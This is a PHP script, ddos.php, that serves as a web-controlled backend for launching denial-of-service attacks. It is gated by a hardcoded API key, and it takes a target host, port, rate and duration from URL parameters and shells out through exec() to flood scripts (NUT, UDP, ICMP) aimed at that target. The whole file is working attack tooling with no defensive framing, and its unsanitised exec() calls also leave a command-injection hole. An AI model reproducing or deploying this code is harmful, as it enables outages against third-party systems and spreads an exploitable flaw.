<?php

    // Usage http://SERVERIP/ddos.php?Key=[]&host=[]&port=[]&bytes=[]&time=[]&type=[]
    
    $apikey = $_GET['Key'];
    $target = $_GET['host'];
    $port = $_GET['port'];
    $power = $_GET['bytes'];
    $method = $_GET['type'];
    $time = $_GET['time'];
    
    if ($apikey != "Kobeni1337") {
    exit("Invailed APIKEY");
    }
    
        if ($method == "") {  
        exit("Methods: <br> NUT <br> UDP <br> ICMP <br> HEX ");
        }
        if ($target == "") {
            exit("Enter IP?");
        }      
        if ($time > 600) {
            exit("Max time is 600");
        }    
        if ($port > 65535) {
            exit("Maximum port is 65535");
        }
        if ($port < 0) {
            exit("Minimum port is 0");
        }
        
        

        if ($method == "NUT") {        
        echo "Attack sent with $method to $target on port $port for $power bytes a second for $time seconds";
        exec("perl nut.pl $target $port $power $time");
        }    
        if ($method == "UDP"){                  
        echo "Attack sent with $method to $target for $power threads for $time seconds";
        exec("python udp.py $target $port $time");              
        }  
        if($method == "ICMP"){
        echo "Attack sent with $method to $target for $power threads for $time seconds";
        exec("python icmp.py $target $port $time"); 
		}
	
		
     
?>